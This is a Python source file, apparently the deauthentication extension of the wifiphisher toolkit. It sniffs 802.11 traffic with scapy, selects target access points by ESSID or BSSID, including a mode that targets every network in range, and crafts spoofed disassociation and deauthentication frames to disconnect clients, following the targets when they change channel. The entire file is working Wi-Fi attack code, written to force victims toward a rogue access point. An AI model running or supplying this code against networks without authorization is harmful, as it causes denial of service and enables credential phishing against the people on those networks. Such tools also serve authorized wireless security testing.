"""
Extension that sends 3 DEAUTH/DISAS Frames:
 1 from the AP to the client
 1 from the client to the AP
 1 to the broadcast address
"""

import logging
from collections import defaultdict

import scapy.layers.dot11 as dot11
import wifiphisher.common.constants as constants
import wifiphisher.common.globals as universal

logger = logging.getLogger(__name__)

def is_deauth_frame(packet):
    """
    Determine if the sending frame is deauth frame
    :param packet: A scapy.layers.RadioTap object
    :type packet: scapy.layers.RadioTap
    :return: True if the frame is belonged to deauth module
    :rtype: bool
    """
    if packet.subtype == 10 or packet.subtype == 12:
        return True
    return False

class Deauth(object):
    """
    Handles all the deauthentication process.
    """

    def __init__(self, data):
        """
        Setup the class with all the given arguments.

        :param self: A Deauth object
        :param data: Shared data from main engine
        :type self: Deauth
        :type data: tuple
        :return: None
        :rtype: None
        """

        self._observed_clients = set()
        self._should_continue = True
        self._data = data
        # the bssids having the same ESSID
        self._deauth_bssids = dict()
        # channel mapping to the frames list
        self._packets_to_send = defaultdict(list)

    @staticmethod
    def _craft_packet(sender, receiver, bssid):
        """
        Return a list with disassociation packet followed by a
        deauthentication packet

        :param sender: The MAC address of the sender
        :param receiver: The MAC address of the receiver
        :param bssid: The MAC address of the AccessPoint
        :type sender: str
        :type receiver: str
        :type bssid: str
        :return: list
        :rtype: A list with disassociation followed by deauthentication packet
        """

        # craft disassociation packet
        disassoc_part = dot11.Dot11(
            type=0, subtype=10, addr1=receiver, addr2=sender, addr3=bssid)
        disassoc_packet = (
            dot11.RadioTap() / disassoc_part / dot11.Dot11Disas())

        # craft deauthentication packet
        deauth_part = dot11.Dot11(
            type=0, subtype=12, addr1=receiver, addr2=sender, addr3=bssid)
        deauth_packet = (dot11.RadioTap() / deauth_part / dot11.Dot11Deauth())

        return [disassoc_packet, deauth_packet]

    @staticmethod
    def _extract_bssid(packet):
        """
        Return the bssid of access point based on the packet type

        :param packet: A scapy.layers.RadioTap object
        :type packet: scapy.layers.RadioTap
        :return: bssid or None if it is WDS
        :rtype: str or None
        .. note: 0 0 -> IBBS
                 0 1 -> from AP
                 1 0 -> to AP
        """

        ds_value = packet.FCfield & 3
        to_ds = ds_value & 0x1 != 0
        from_ds = ds_value & 0x2 != 0

        # return the correct bssid based on the type
        return ((not to_ds and not from_ds and packet.addr3)
                or (not to_ds and from_ds and packet.addr2)
                or (to_ds and not from_ds and packet.addr1) or None)

    def _is_target(self, packet):
        """
        Check if this is the target attacking bssid
        :param self: A Deauth object
        :param packet: A scapy.layers.RadioTap object
        :type self: Deauth
        :type packet: scapy.layers.RadioTap
        :return: True if this is the target attacking bssid else False
        :rtype: bool
        """

        if (packet.addr3 != self._data.rogue_ap_mac
                and packet.addr3 not in self._deauth_bssids):
            try:
                essid = packet[dot11.Dot11Elt].info.decode("utf8")
            except UnicodeDecodeError:
                logger.warning("Unable to decode the essid with with bssid %s",
                               packet.addr3)
                return False

            # only compare essid when -dE is given
            return ((self._data.args.deauth_essid
                     and essid == self._data.args.deauth_essid) or
                    # frenzy deauth
                    (not self._data.args.deauth_essid
                     and not self._data.target_ap_bssid) or
                    # target_ap_bssid without -dE option
                    (not self._data.args.deauth_essid
                     and self._data.target_ap_bssid == packet.addr3) or False)

    def get_packet(self, packet):
        """
        Process the Dot11 packets and add any desired clients to
        observed_clients.

        :param self: A Deauth object
        :param packet: A scapy.layers.RadioTap object
        :type self: Deauth
        :type packet: scapy.layers.RadioTap
        :return: A tuple with channel list followed by packets list
        :rtype: tuple
        """

        packets_to_send = list()

        # basic malformed frame check
        try:
            # Discard WDS frame
            ds_value = packet.FCfield & 3
            if ds_value == 3:
                return self._packets_to_send
            receiver = packet.addr1
            sender = packet.addr2
        except AttributeError:
            logger.debug("Malformed frame doesn't contain address fields")
            return self._packets_to_send

        # obtain the channel for this packet
        try:
            # channel is in the third IE of Dot11Elt
            channel = ord(packet[dot11.Dot11Elt][2].info)

            # check if this is valid channel
            if channel not in universal.ALL_2G_CHANNELS:
                return self._packets_to_send
        except (TypeError, IndexError):
            # just return empty channel and packet
            logger.debug("Malformed frame doesn't contain channel field")
            return self._packets_to_send

        bssid = self._extract_bssid(packet)
        # check beacon if this is our target deauthing BSSID
        if (packet.haslayer(dot11.Dot11Beacon)
                and bssid not in self._deauth_bssids
                and self._is_target(packet)):
            # listen beacon to get the target attacking BSSIDs for the
            # specified ESSID
            packets_to_send += self._craft_packet(bssid,
                                                  constants.WIFI_BROADCAST,
                                                  bssid)
            logger.info("Target deauth BSSID found: %s", bssid)
            # remember the channel of the given bssid
            self._deauth_bssids[bssid] = str(channel)
        elif bssid in self._deauth_bssids:
            # the bssid is already in the deauth set and we need to check
            # if the channel of the target AP has been changed
            if str(channel) != self._deauth_bssids[bssid]:
                logger.info("BSSID: %s changes channel to %d", bssid, channel)
                self._update_target_ap_frames(str(channel),
                                              str(self._deauth_bssids[bssid]), bssid)
        if bssid not in self._deauth_bssids:
            return self._packets_to_send

        clients = self._add_clients(sender, receiver, bssid)
        if clients:
            self._observed_clients.add(clients[0])
            packets_to_send += clients[1]
            logger.info("Client with BSSID %s is now getting deauthenticated", clients[0])

        self._packets_to_send[str(channel)] += packets_to_send

        return self._packets_to_send

    def _update_target_ap_frames(self, new_channel, old_channel, bssid):
        """
        :param self: A Deauth object
        :param new_channel: New channel for the target AP
        :param old_channel: Old channel for the target AP
        :type self: Deauth
        :param bssid: Address of the bssid
        :type new_channel: str
        :type old_channel: str
        :type bssid: str
        :return: None
        :rtype: None
        """
        old_channel_list = []
        new_channel_list = []
        for pkt in self._packets_to_send[old_channel]:
            if pkt.addr3 != bssid:
                old_channel_list.append(pkt)
            else:
                new_channel_list.append(pkt)
        self._packets_to_send[old_channel] = old_channel_list
        # append the frames of target AP to the new channel
        self._packets_to_send[new_channel].extend(new_channel_list)
        # update the channel of bssid
        self._deauth_bssids[bssid] = new_channel

    def _add_clients(self, sender, receiver, bssid):
        """
        Return a tuple containing client followed by packets if the given
        packet is valid and return None otherwise

        :param self: A Deauth object
        :param sender: Address of the sender
        :param receiver: Address of the receiver
        :param bssid: Address of the bssid
        :type self: Deauth
        :type sender: str
        :type receiver: str
        :type bssid: str
        :return: (client: str, packets: list) or None
        :rtype: tuple or None
        """

        # addresses that are not acceptable
        non_valid_addresses = constants.NON_CLIENT_ADDRESSES.union(
            self._observed_clients)

        # craft the packets
        packets = lambda: (self._craft_packet(receiver, sender, bssid) +
                           self._craft_packet(sender, receiver, bssid))

        # return the client and packets if valid and None otherwise
        # it uses short circuiting to improve performance
        return (sender not in non_valid_addresses
                and receiver not in non_valid_addresses and
                (sender == bssid and
                 (receiver, packets()) or receiver == bssid and
                 (sender, packets())) or None)

    def send_output(self):
        """
        Get any relevant output message

        :param self: A Deauth object
        :type self: Deauth
        :return: A list with all the message entries
        :rtype: list
        """

        return list(map("DEAUTH/DISAS - {}".format, self._observed_clients))

    def send_channels(self):
        """
        Send channes to subscribe

        :param self: A Deauth object
        :type self: Deauth
        :return: A list with all interested channels
        :rtype: list
        """
        # we cannot do frequency hopping if users have only one card
        if not self._data.is_freq_hop_allowed:
            return [self._data.target_ap_channel]

        if self._data.target_ap_bssid and not self._data.args.deauth_essid\
                and not self._data.args.channel_monitor:
            return [self._data.target_ap_channel]

        if self._data.args.deauth_channels and \
           len(self._data.args.deauth_channels) > 0:
            return list(map(str, self._data.args.deauth_channels))

        return list(map(str, universal.ALL_2G_CHANNELS))

    def on_exit(self):
        """
        Free all the resources regarding to this module
        :param self: A Deauth object
        :type self: Deauth
        :return: None
        :rtype: None
        """
        pass
